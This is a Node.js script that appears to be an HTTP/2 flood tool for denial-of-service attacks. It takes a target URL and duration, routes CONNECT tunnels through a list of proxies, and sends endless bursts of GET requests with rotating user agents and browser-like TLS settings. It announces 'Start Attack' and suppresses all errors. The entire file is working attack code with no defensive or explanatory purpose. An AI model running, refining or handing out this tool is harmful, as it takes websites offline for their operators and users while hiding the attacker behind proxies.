const { exec } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const fs = require('fs');
const url = require('url');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');
tls.DEFAULT_ECDH_CURVE;

let payload = {};

try {
  var proxies = fs.readFileSync("proxies.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (error) {
  console.log('Proxy file not found: "proxies.txt".');
  process.exit();
}

try {
  var objective = process.argv[2];
  var parsed = url.parse(objective);
} catch (error) {
  console.log('Failed to load target data.');
  process.exit();
}

const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
];

let SignalsList = sigalgs.join(':');

try {
  var UAs = fs.readFileSync('useragent.txt', 'utf-8').replace(/\r/g, '').split('\n');
} catch (error) {
  console.log('Failed to load useragent.txt');
}

class TlsBuilder {
  constructor(socket) {
    this.curve = "GREASE:X25519:x25519"; // Default
    this.sigalgs = SignalsList;
    this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_NO_TICKET |
      crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_COMPRESSION |
      crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
      crypto.constants.SSL_OP_TLSEXT_PADDING |
      crypto.constants.SSL_OP_ALL |
      crypto.constants.SSLcom;
  }

  alert() {
    console.log('Start Attack');
  }

  http2Tunnel(socket) {
    socket.setKeepAlive(true, 1000);
    socket.setTimeout(10000);
    payload[":method"] = "GET";
    payload["Referer"] = objective;
    payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
    payload[":path"] = parsed.path;

    const tunnel = http2.connect(parsed.href, {
      createConnection: () => tls.connect({
        socket: socket,
        ciphers: tls.getCiphers().join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256" + ":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:" + 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        host: parsed.host,
        servername: parsed.host,
        secure: true,
        //echdCurve: this.curve,
        honorCipherOrder: true,
        requestCert: true,
        secureOptions: this.Opt, //"SSL_OP_ALL",
        sigalgs: this.sigalgs,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
      }, () => {
        for (let i = 0; i < 12; i++) {
          setInterval(async () => {
            await tunnel.request(payload).close();
          });
        }
      })
    });
  }
}

const BuildTLS = new TlsBuilder();
BuildTLS.alert();

const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity });

function Runner() {
  for (let i = 0; i < 120; i++) {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const [host, port] = proxy.split(':');

    const req = http.get({
      host: host,
      port: port,
      timeout: 10000,
      method: "CONNECT",
      agent: keepAliveAgent,
      path: parsed.host + ":443"
    });
    req.end();

    req.on('connect', (_, socket) => {
      BuildTLS.http2Tunnel(socket);
    });

    req.on('end', () => {
      req.resume();
      req.close();
    });
  }
}

setInterval(Runner);

setTimeout(function () {
  console.log('Attack End !');
  process.exit();
}, process.argv[3] * 1000);

process.on('uncaughtException', function (er) {});
process.on('unhandledRejection', function (er) {});
